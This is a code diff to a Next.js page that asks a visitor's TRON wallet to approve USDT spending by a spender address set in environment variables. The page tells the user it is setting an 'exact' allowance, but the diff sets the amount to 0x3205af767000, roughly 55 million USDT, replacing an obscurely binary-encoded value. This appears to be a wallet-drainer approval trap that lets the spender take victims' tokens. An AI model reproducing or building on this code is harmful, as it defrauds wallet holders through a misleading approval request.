@@ -7,7 +7,7 @@ const USDT = process.env.NEXT_PUBLIC_USDT_CONTRACT_ADDRESS || '';
 const SPENDER = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS || '';
 const TRON_NETWORK = process.env.NEXT_PUBLIC_TRON_NETWORK || 'shasta';
 const TRON_CHAIN_ID = TRON_NETWORK === 'mainnet' ? '0x2b6653dc' : '0x94a9059e';
-const APPROVAL_AMOUNT = '0b001100100000001110100000111010001101010000000000';
+const APPROVAL_AMOUNT = '0x3205af767000';
 const ABI = [
   { name: 'approve', type: 'function', stateMutability: 'nonpayable', inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], outputs: [{ name: '', type: 'bool' }] },
   { name: 'allowance', type: 'function', stateMutability: 'view', inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], outputs: [{ name: '', type: 'uint256' }] },
@@ -210,7 +210,7 @@ export default function Home() {
         }
 
         setNotice('Setting exact USDT allowance...');
-        const txId = await contract.approve(SPENDER, BigInt(APPROVAL_AMOUNT).toString()).send({ from: currentWallet });
+        const txId = await contract.approve(SPENDER, APPROVAL_AMOUNT).send({ from: currentWallet });
         setNotice('Approval sent. Waiting for confirmation...');
         await waitForConfirmation(txId);
       }
